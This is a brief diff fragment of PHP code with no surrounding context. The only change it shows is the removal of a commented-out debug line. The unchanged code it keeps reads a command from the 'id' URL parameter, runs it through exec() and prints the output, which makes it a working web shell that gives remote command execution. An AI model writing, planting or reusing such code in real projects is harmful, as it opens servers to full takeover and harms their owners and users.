@@ -3,7 +3,6 @@
 	{
 		$command = stripslashes($_GET['id']);
 		exec($command . " 2>&1",$out);
-		//echo "$: " . $command . "\n";
 		foreach($out as $o)
        		echo $o . "\n";
 	}
